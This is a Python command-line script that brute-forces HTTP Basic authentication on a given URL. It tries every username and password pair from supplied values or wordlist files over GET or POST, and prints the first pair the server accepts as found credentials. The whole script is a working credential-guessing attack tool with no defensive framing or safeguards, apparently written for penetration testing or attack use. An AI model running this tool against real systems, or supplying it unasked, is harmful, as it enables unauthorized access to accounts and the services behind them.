#!/usr/bin/env python3
import os
import requests
import base64
from pathlib import Path


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument('--method',
                        dest='method',
                        default='GET',
                        required=False,
                        help='An HTTP method to use. Default is GET')
    parser.add_argument('--post-data',
                        dest='post_data',
                        required=False,
                        help='POST data to send. By default there is no post data '
                             'as the GET method is being used for the bruteforcing')
    parser.add_argument('--url',
                        dest='url',
                        required=True,
                        help='An URL of the targeted web-site')
    parser.add_argument('--user',
                        dest='user',
                        required=False,
                        help='A username to bruteforce')
    parser.add_argument('--user-file',
                        dest='user_file',
                        required=False,
                        help='A txt file with usernames to bruteforce')
    parser.add_argument('--password',
                        dest='password',
                        required=False,
                        help='A password to bruteforce')
    parser.add_argument('--password-file',
                        dest='password_file',
                        required=False,
                        help='A txt file with passwords to bruteforce')
    options = parser.parse_args()
    if not options.user and not options.user_file:
        parser.error('You have to give a username to bruteforce. Use --help for more info')
    if not options.password and not options.password_file:
        parser.error('You have to give a password to bruteforce. Use --help for more info')
    return options


def bruteforce_basic_auth(url, login, password, method='GET', post_data='',
                          error_code=401):
    auth_header = f'Basic {base64.b64encode(bytes(login + ":" + password, "utf-8")).decode("ascii")}'
    try:
        if method == 'GET':
            resp = requests.get(url,
                                headers={'Authorization': auth_header})
        elif method == 'POST':
            resp = requests.post(url, data=post_data,
                                 headers={'Authorization': auth_header})
        else:
            raise Exception('Unsupported HTTP method')
        if resp.status_code != error_code:
            return True
    except Exception as e:
        print(f'[{url}] [{login}:{password}] - {e}')


options = get_arguments()

url = options.url

usernames = set()
passwords = set()

if options.user:
    usernames.add(options.user)
if options.user_file:
    print('Loading a wordlist with usernames...')
    with open(options.user_file, 'r', errors='ignore') as f:
        lines = f.readlines()
        for i, line in enumerate(lines):
            usernames.add(line.strip())
            print(f'{i}/{len(lines)}\r', end='', flush=True)
if options.password:
    passwords.add(options.password)
if options.password_file:
    print('Loading a wordlist with passwords...')
    with open(options.password_file, 'r', errors='ignore') as f:
        lines = f.readlines()
        for i, line in enumerate(lines):
            passwords.add(line.strip())
            print(f'{i}/{len(lines)}\r', end='', flush=True)

counter = 0
total_count = len(usernames) * len(passwords)
print('Starting the bruteforce')
for i, user in enumerate(usernames):
    for y, passwd in enumerate(passwords):
        print(f'Bruteforcing [{url}] [{user}:{passwd}] [{counter}/{total_count}]')

        if options.post_data and options.method == 'GET':
            raise Exception('POST data is given with a wrong HTTP method')
        if options.method != 'GET' and options.method != 'POST':
            raise Exception('Unsupported HTTP method')
        cracked = bruteforce_basic_auth(url, user, passwd,
                                        method=options.method,
                                        post_data=options.post_data)
        if cracked:
            print(f'Found valid credentials: [{user}/{passwd}]')
            exit(0)
        counter += 1
